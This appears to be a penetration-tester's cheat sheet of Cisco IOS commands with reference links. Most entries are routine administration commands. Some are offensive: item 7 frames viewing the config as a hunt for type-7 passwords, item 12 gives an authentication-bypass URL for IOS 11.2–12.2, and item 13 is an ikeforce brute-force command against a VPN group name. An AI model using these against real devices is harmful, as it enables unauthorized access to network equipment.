### 1. show mode of as500
```
show system mode
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/server_nw_virtual/2-5_release/command_reference/show.html#wp1128243
__________
### 2. add vlan to your interface
```
interface GigabitEthernet7; switchport trunk allowed vlan add 2
```
**- cisco,networking**
#### References:

http://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus5000/sw/configuration/guide/cli/CLIConfigurationGuide/AccessTrunk.html
__________
### 3. raise privs cisco
```
enable
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 4. start configuration
```
conf t
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 5. show sessions
```
show session
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 6. show version
```
show version
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 7. show the config which is running in flash, looking for password 7 and the like
```
show running-config
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 8. show the config which runs on start up
```
show startup-config
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 9. show interface information : add breif for less
```
show ip interface
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 10. show the routes of the switch
```
show ip route
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 11. show the ACL for the switch
```
show access-lists
```
**- cisco**
#### References:

http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
__________
### 12. Bypass auth on ios 11.2-12.2
```
http://[ip]/level/56/exec/show/config
```
**- cisco,interesting,web application,remote command shell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 13. Try to brute the remote group name : cisco
```
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
```
**- cisco,scanning,brute**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
https://github.com/SpiderLabs/ikeforce
https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/
__________
